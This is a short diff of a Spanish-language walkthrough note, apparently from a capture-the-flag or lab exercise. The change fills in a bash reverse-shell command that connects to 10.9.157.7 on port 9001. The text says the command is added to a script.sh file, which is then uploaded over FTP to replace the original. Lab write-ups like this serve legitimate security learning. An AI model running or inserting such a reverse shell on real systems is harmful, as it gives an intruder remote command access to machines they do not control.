@@ -85,5 +85,5 @@ el archivo removed.files.log solo es una captura de la ejecusion del script sin 
 ![[Pasted image 20240120175636.png]]
 
 ### Reverse shell
-lo primero que vamos hacer sera editar el script.sh para agregar una reverse shell aregando el siguiente comando ``
+lo primero que vamos hacer sera editar el script.sh para agregar una reverse shell aregando el siguiente comando `bash -c "bash -i >& /dev/tcp/10.9.157.7/9001 0>&1"` una ves hecho esto vamos al servicio ftp y vamos a subir el nuevo script para ello nos posicionamos en la misma ruta donde esta el script anterior y solo hacemos 
 ![[Pasted image 20240120181957.png]]
